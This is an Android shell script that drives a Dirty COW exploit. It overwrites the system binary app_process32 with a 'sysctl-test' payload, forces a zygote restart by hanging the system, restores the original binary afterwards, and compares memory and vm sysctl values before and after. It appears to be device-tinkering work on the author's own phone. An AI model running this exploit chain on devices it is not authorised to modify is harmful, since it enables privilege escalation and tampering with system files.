#!/system/bin/sh
# Test sysctl writes via Dirty COW. Same COW dance as stop-daemons.sh
# but uses sysctl-test payload (no daemon stopping).

DIRTYCOW=/data/local/tmp/dirtycow
PAYLOAD=/data/local/tmp/sysctl-test
ORIG=/data/local/tmp/app_process32.orig
TARGET=/system/bin/app_process32
OUTFILE=/data/local/tmp/sysctl-output.txt

for f in "$DIRTYCOW" "$PAYLOAD" "$ORIG"; do
    if [ ! -f "$f" ]; then echo "MISSING: $f"; exit 1; fi
done

# Capture meminfo BEFORE
echo "=== BEFORE ===" > $OUTFILE
grep -E 'MemTotal|MemFree|Buffers|Cached|Slab|SReclaimable|SUnreclaim' /proc/meminfo >> $OUTFILE
cat /proc/sys/vm/vfs_cache_pressure >> $OUTFILE
cat /proc/sys/vm/extra_free_kbytes >> $OUTFILE
cat /proc/sys/vm/min_free_kbytes >> $OUTFILE

# Find zygote PID
ORIG_PID=""
for p in $(ls /proc | grep '^[0-9]'); do
    CMD=$(cat /proc/$p/cmdline 2>/dev/null | tr '\0' ' ')
    case "$CMD" in *zygote*) ORIG_PID=$p; break;; esac
done
if [ -z "$ORIG_PID" ]; then echo "Cannot find zygote"; exit 1; fi
echo "Zygote PID: $ORIG_PID"

# Hang system
am hang --allow-restart &
AM_PID=$!
sleep 2

# Dirty COW
echo "COW: injecting sysctl-test..."
$DIRTYCOW "$TARGET" "$PAYLOAD"
echo "Waiting for watchdog..."

# Restorer
(
    while [ -d /proc/$ORIG_PID ]; do sleep 2; done
    echo "Restorer: zygote died, waiting 5s..."
    sleep 5
    $DIRTYCOW "$TARGET" "$ORIG"
    echo "Restorer: original restored."
) &
RESTORER_PID=$!

# Wait for restorer
WAITED=0
while [ $WAITED -lt 120 ]; do
    if ! kill -0 $RESTORER_PID 2>/dev/null; then break; fi
    sleep 5
    WAITED=$((WAITED + 5))
done
kill $AM_PID 2>/dev/null

# Wait for zygote to come back
echo "Waiting for zygote restart..."
sleep 10

# Capture meminfo AFTER
echo "" >> $OUTFILE
echo "=== AFTER ===" >> $OUTFILE
grep -E 'MemTotal|MemFree|Buffers|Cached|Slab|SReclaimable|SUnreclaim' /proc/meminfo >> $OUTFILE
cat /proc/sys/vm/vfs_cache_pressure >> $OUTFILE
cat /proc/sys/vm/extra_free_kbytes >> $OUTFILE
cat /proc/sys/vm/min_free_kbytes >> $OUTFILE

echo "=== RESULTS ==="
cat $OUTFILE
echo "Done."
